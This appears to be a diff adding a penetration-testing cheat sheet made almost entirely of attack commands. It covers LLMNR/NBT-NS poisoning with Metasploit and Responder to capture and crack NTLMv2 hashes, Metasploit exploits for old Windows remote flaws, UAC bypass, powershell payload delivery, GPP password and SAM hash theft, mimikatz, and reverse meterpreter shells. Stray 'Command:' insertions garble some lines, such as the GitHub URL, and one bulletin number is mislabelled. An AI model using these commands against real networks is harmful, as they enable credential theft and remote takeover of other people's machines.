@@ -1,0 +1,122 @@
+***LLMNR / NBT-NS Spoofing***
+
+Steal credentials off the network.
+Metasploit LLMNR / NetBIOS requests
+
+Spoof / poison LLMNR / NetBIOS requestsCommand: 
+
+auxiliary/spoof/llmnr/llmnr_response
+auxiliary/spoof/nbns/nbns_response
+
+Capture the hashesCommand: 
+
+auxiliary/server/capture/smb
+auxiliary/server/capture/http_ntlm
+
+You’ll end up with NTLMv2 hash, Command:  use john or hashcat to crack it.
+Responder.py
+
+Alternatively you can Command:  use responder.
+
+git clone httpsCommand: //github.com/SpiderLabs/Responder.git
+python Responder.py -i local-ip -I eth0
+-----------------------------------------------------------------------------------
+
+Hash Examples: 
+
+Just use hash-identifier
+
+
+------------------------------------------------------------------------------
+
+***Top metasploit modules.***
+
+###Remote Windows Metasploit Modules (exploits)###
+	
+
+Command:  use exploit/windows/smb/ms08_067_netapi
+Descripton: MS08_067 Windows 2k, XP, 2003 Remote Exploit
+
+	
+
+
+Command:  use exploit/windows/dcerpc/ms06_040_netapi
+Descripton: MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit
+
+Command:  use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+Descripton: MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit
+
+###Local Windows Metasploit Modules (exploits)###
+
+
+Command:  use exploit/windows/local/bypassuac
+Descripton: Bypass UAC on Windows 7 + Set target + arch, x86/64
+
+###Auxilary Metasploit Modules###
+
+
+Command:  use auxiliary/scanner/http/dir_scanner
+Descripton: Metasploit HTTP directory scanner
+
+Command:  use auxiliary/scanner/http/jboss_vulnscan
+Descripton: Metasploit JBOSS vulnerability scanner
+
+Command:  use auxiliary/scanner/mssql/mssql_login
+Descripton: Metasploit MSSQL Credential Scanner
+
+Command:  use auxiliary/scanner/mysql/mysql_version
+Descripton: Metasploit MSSQL Version Scanner
+
+Command:  use auxiliary/scanner/oracle/oracle_login
+Descripton: Metasploit Oracle Login Module
+
+###Metasploit Powershell Modules###
+
+Command:  use exploit/multi/script/web_delivery
+Descripton: Metasploit powershell payload delivery module
+
+Command: use post/windows/manage/powershell/exec_powershell
+Descripton: Metasploit upload and run powershell script through a session
+
+Command:  use exploit/multi/http/jboss_maindeployer
+Descripton: Metasploit JBOSS deploy
+
+Command:  use exploit/windows/mssql/mssql_payload
+Descripton: Metasploit MSSQL payload
+
+###Post Exploit Windows Metasploit Modules for privilege escalation.###
+
+Command: run post/windows/gather/win_privs
+Descripton: Metasploit show privileges of current Command:  user
+
+Command:  use post/windows/gather/credentials/gpp
+Descripton: Metasploit grab GPP saved passwords
+
+load mimikatz -> wdigest
+Descripton: Metasploit load Mimikatz
+
+Command: run post/windows/gather/local_admin_search_enum
+Descripton: Idenitfy other machines that the supplied domain Command:  user has administrative access to
+
+Command: run post/windows/gather/smart_hashdump
+Descripton: Automated dumping of sam file, tries to esc privileges etc
+---------------------------------------------------------------------------------------------------------------------
+***Meterpreter Payloads***
+
+###Windows reverse meterpreter payload###
+
+Command: set payload windows/meterpreter/reverse_tcp
+Descripton: Windows reverse tcp payload
+
+###Windows VNC Meterpreter payload###
+
+Command: set payload windows/vncinject/reverse_tcp
+Command: set ViewOnly false
+Description: Meterpreter Windows VNC Payload
+
+###Linux Reverse Meterpreter payload###
+
+Command: set payload linux/meterpreter/reverse_tcp
+Descripton: Meterpreter Linux Reverse Payload
+------------------------------------------------------------------------------
+
